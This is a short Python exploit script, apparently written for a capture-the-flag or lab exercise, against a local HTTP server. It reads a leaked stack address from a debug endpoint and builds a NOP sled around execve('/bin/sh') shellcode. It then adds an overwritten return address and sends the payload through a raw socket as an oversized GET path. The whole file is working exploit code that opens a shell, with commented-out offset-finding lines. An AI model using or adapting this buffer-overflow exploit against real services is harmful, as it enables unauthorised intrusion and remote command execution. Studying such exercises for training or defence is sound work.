from pwn import *
import struct
import requests
import socket

host = 'localhost'
port = 8080

leak_url = f'http://{host}:{port}/debug/status_line'

# g = cyclic_gen(n=8)
# #payload = g.get(500)
# payload = b"A"*175 + b"C"*8
# url = f'http://{host}:{port}/' + str(payload, 'ascii')
# r = requests.get(url)

# #print(g.find(b"aaaaaawa")) >>>> (170, 0, 170)


payload_len = 175 + 8 

shellcode = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
pad2 = 0x50
payload = b"\x90" * (payload_len - 8 - len(shellcode) - pad2)
payload += shellcode
payload += b"\x90" * pad2

r = requests.get(leak_url)
status_line = r.text.split(" ")[0].strip()
status_line = int(status_line, 16)
payload += struct.pack("<Q", status_line + 0x80)[:-2]


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(b"GET /" + payload + b" HTTP/1.1\r\nHost: Dongs\r\n\r\n")
